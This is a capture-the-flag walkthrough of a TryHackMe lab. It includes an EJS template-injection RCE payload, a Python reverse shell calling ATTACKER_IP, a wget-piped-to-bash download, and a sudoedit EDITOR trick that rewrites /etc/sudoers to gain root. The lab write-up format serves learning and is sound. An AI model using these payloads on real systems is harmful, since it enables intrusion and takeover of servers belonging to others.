# Whiterose Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/whiterose) on TryHackMe.

This challenge based on ep "409 Conflict" on Mr. Robot series

We also have this message "You will need these: `Olivia Cortez:olivi8`"

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's Begin !

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP whiterose.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sS whiterose.thm 
```

It finds 2 open ports:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

If we visit the website hosted on port 80 `http://cyprusbank.thm/` we find the error "Unknown host: cyprusbank.thm"; this simply means we have to add it in our hosts file.
Now we can reload the page and see that the site is currently under maintenance.

Source code does not reveal anything interesting, let's scan for hidden directories:
```
gobuster dir -u http://cyprusbank.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 64 
```

We can also check for subdomains and virtual hosts:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://FUZZ.cyprusbank.thm 
```

```bash
gobuster vhost -u http://cyprusbank.thm  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain
```

It quickly find a virtual one:
```
Found: admin.cyprusbank.thm Status: 302 [Size: 28] [--> /login]
```

Add this new domain to your hosts file and than visit it in your browser.
There is a login page, we can use the provided credentials to access.

Now we see a list of bank transfers, looking around we can see a search page, a message one and finally the settings which are restricted probably to admins.

We can also notice that once we logged we got assigned a cookie called `connect.sid`.

The messages one attracted my attention as it says that was recently implemented.
Visiting that page we can see that the `c` parameter gets passed in the URL:
```
http://admin.cyprusbank.thm/messages/?c=5
```

After sending a couple of test message we quickly realize that the parameter refers to the number of lines of messages that get displayed.
Changing it values to a higher number like `50` for test showed some chat history leaking the password of the Gayle user: `Gayle Bev:REDACTED_PASSWORD`, we also find out he is an admin.

Let's try to logout and log back in as this user.
Now on the transactions page we can read Tyler Wellick's phone number:
--> REDACTED

We should now have access to the settings, looks like that here we can reset a customer password.
Both values are sent as a body payload in a POST request.

Here i decided to try to find some injection vulnerabilities by trying different payloads.
After some time spent i did not find any like this, maybe there are additional parameters.

Trying for URL parameters with `ffuf` got me no results, maybe other body parameters?:
```bash
ffuf -X POST \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-H "Cookie: connect.sid=s%3Akdhu1zMOKsUdd8eMdbKYZdFGG6tgIvrJ.mI%2FxPTBWfcqeSPrZ5JmJRUb6Hf2434yJ%2FgezTArysgY" \
-H "Accept-Encoding: gzip, deflate, br" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "name=test&password=test&FUZZ=test" \
-u http://admin.cyprusbank.thm/settings  \
-fc 302 -t 200 -mc all -fs 2098
```

This successfully found: 
```
error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 740ms]
password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 749ms]
message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 702ms]
delimiter               [Status: 200, Size: 1445, Words: 327, Lines: 35, Duration: 739ms]
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 787ms]
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 722ms]
strict                  [Status: 500, Size: 2301, Words: 161, Lines: 11, Duration: 580ms]
async                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 150ms]
```

Let's play a bit with this new parameters now.
Adding any of the parameters that resulted in the error 500 code got me this:
```html
TypeError: /home/web/app/views/settings.ejs:4<br> &nbsp; &nbsp;2| &lt;html lang=&quot;en&quot;&gt;<br> &nbsp; &nbsp;3| &nbsp; &lt;head&gt;<br> &gt;&gt; 4| &nbsp; &nbsp; &lt;%- include(&quot;../components/head&quot;); %&gt;<br> &nbsp; &nbsp;5| &nbsp; &nbsp; &lt;title&gt;Cyprus National Bank&lt;/title&gt;<br> &nbsp; &nbsp;6| &nbsp; &lt;/head&gt;<br> &nbsp; &nbsp;7| &nbsp; &lt;body&gt;<br>
<br>include is not a function<br> 
&nbsp; &nbsp;at settings (&quot;/home/web/app/views/settings.ejs&quot;:53:17)<br> &nbsp; &nbsp;at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br> &nbsp; &nbsp;at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br> &nbsp; &nbsp;at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br> &nbsp; &nbsp;at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br> &nbsp; &nbsp;at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br> &nbsp; &nbsp;at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br> &nbsp; &nbsp;at /home/web/app/routes/settings.js:27:7<br> &nbsp; &nbsp;at processTicksAndRejections (node:internal/process/task_queues:96:5)
```

Looks like we are gonna have to do some template injection on the EJS.
When passing `&delimiter=test` i get a different output:
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <%- include("../components/head"); %>
    <title>Cyprus National Bank</title>
  </head>
  <body>
    <%- include("../components/navbar", { logged: true, active: "settings" }); %>
    <div class="container">
      <h2 class="text-center mb-4 mt-5">Customer Settings</h2>
      <% if (typeof message != 'undefined' )  { %>
        <div class="alert alert-info mb-3"><%= message %></div>
      <% } %>
      <% if (password != -1) { %>
        <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
      <% } %>
      <% if (typeof error != 'undefined') { %>
        <div class="alert alert-danger mb-3"><%= error %></div>
      <% } else { %>
        <form method="post" class="col d-flex flex-column align-items-center">
          <div class="form-floating mb-3 w-100" w-100>
            <input name="name" type="text" id="password" class="form-control" placeholder="Enter a customer name" required>
            <label for="username">Enter a customer name</label>
          </div>
          <div class="form-floating mb-3 w-100" w-100>
            <input name="password" type="password" id="password" class="form-control" placeholder="Enter a new password" required>
            <label for="password">Enter a new password</label>
          </div>
          <button class="btn btn-dark w-100 btn-lg">Save</button>
        </form>
      <% } %>
    </div>
  </body>
</html>

```

Searching online i found that EJS had some template injection -> RCE vulns, the one that worked here was appending this new parameter:
```bash
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('wget http://ATTACKER_IP:8000/test.ejs');s
```

Before sending the request have a python server ready:
```bash
python3 -m http.server
```

This worked, i got the attempted connection in the logs.

I tried to pass some payloads for a reverse shell but none seemed to work, so i opted for creating a reverse shell on the machine and retrieving that :
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Send this
```js
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('wget http://ATTACKER_IP:8000/shell | bash');s
```

Before sending it be sure to have a listener ready:
```bash
nc -lvnp 1234
```

Now send it, you should receive a shell as the user "web".

We can finally get the first flag in the user home directory:
```bash
cat /home/web/user.txt
```

--> REDACTED

<br/>

### Privilege Escalation
For a more stable connection let's add our SSH key.
Generate them:
```bash
ssh-keygen -t rsa -b 4096 -C "
```

Now you can copy your public key to the current working directory:
```bash
cp ~/.ssh/id_rsa.pub .
```

Start a python server:
```bash
python3 -m http.server
```

On the target machine create this directory: `~/.ssh`.
Download here your public key:
```bash
wget http://ATTACKER_IP:8000/id_rsa.pub
```

Rename the file:
```bash
mv id_rsa.pub authorized_key
```

Now we can finally login via SSH:
```bash
ssh web@whiterose.thm
```

Let's check if we can run anything as super user:
```bash
sudo -l
```

We can see that we can run as sudo:
```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We can exploit it by telling it to open an editor of choice on a specific file, like the sudoers, then there we can grant us priviliges:
```bash
export EDITOR="vim -- /etc/sudoers" 
```

Edit the web line to look like this
```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

Now we can become root and read the flag:
```bash
sudo su
```
```bash
cat /root/root.txt
```
--> REDACTED

<br/>
<br/>

## Conclusion
Congratulations you have successfully exploited several web vulnerabilities and became root.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
